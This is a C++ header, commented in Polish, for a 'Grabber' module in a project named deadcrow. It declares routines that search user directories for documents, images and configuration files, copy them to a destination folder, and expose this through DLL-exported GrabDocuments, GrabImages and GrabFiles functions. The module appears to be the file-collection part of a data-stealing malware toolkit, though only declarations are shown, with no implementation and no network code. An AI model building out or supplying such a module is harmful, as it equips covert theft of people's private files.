#pragma once

#include <string>
#include <vector>
#include <functional>
#include <windows.h>

namespace deadcrow {
namespace modules {

class Grabber {
public:
    // Konstruktor
    Grabber();
    
    // Destruktor
    ~Grabber();
    
    // Struktura przechowująca informacje o pliku
    struct FileInfo {
        std::string path;
        std::string name;
        std::string extension;
        uint64_t size;
        std::string last_modified;
    };
    
    // Wyszukiwanie plików według wzorca
    std::vector<FileInfo> findFiles(const std::string& directory, const std::string& pattern, bool recursive = true);
    
    // Wyszukiwanie plików według rozszerzenia
    std::vector<FileInfo> findFilesByExtension(const std::string& directory, const std::vector<std::string>& extensions, bool recursive = true);
    
    // Kopiowanie plików do katalogu docelowego
    bool copyFiles(const std::vector<FileInfo>& files, const std::string& destination);
    
    // Kopiowanie plików do katalogu docelowego z limitem rozmiaru
    bool copyFilesWithSizeLimit(const std::vector<FileInfo>& files, const std::string& destination, uint64_t max_size_bytes);
    
    // Skanowanie typowych lokalizacji w poszukiwaniu dokumentów
    std::vector<FileInfo> scanForDocuments(const std::vector<std::string>& extensions = {".doc", ".docx", ".pdf", ".txt", ".xls", ".xlsx", ".ppt", ".pptx"});
    
    // Skanowanie typowych lokalizacji w poszukiwaniu obrazów
    std::vector<FileInfo> scanForImages(const std::vector<std::string>& extensions = {".jpg", ".jpeg", ".png", ".gif", ".bmp"});
    
    // Skanowanie typowych lokalizacji w poszukiwaniu plików konfiguracyjnych
    std::vector<FileInfo> scanForConfigFiles(const std::vector<std::string>& extensions = {".ini", ".cfg", ".conf", ".config", ".xml", ".json"});
    
    // Ustawienie callbacka do raportowania statusu
    void setStatusCallback(std::function<void(const std::string&)> callback);
    
    // Ustawienie callbacka do raportowania postępu
    void setProgressCallback(std::function<void(int, int)> callback);
    
    // Funkcja eksportowana dla DLL
    static BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved);
    
private:
    // Callback do raportowania statusu
    std::function<void(const std::string&)> status_callback_;
    
    // Callback do raportowania postępu
    std::function<void(int, int)> progress_callback_;
    
    // Raportowanie statusu
    void reportStatus(const std::string& status);
    
    // Raportowanie postępu
    void reportProgress(int current, int total);
    
    // Pobieranie typowych lokalizacji użytkownika
    std::vector<std::string> getUserDirectories();
    
    // Pobieranie informacji o pliku
    FileInfo getFileInfo(const std::string& path);
    
    // Kopiowanie pliku
    bool copyFile(const std::string& source, const std::string& destination);
};

// Funkcje eksportowane dla DLL
extern "C" __declspec(dllexport) bool GrabFiles(const char* directory, const char* pattern, const char* destination, bool recursive);
extern "C" __declspec(dllexport) bool GrabDocuments(const char* destination);
extern "C" __declspec(dllexport) bool GrabImages(const char* destination);

} // namespace modules
} // namespace deadcrow
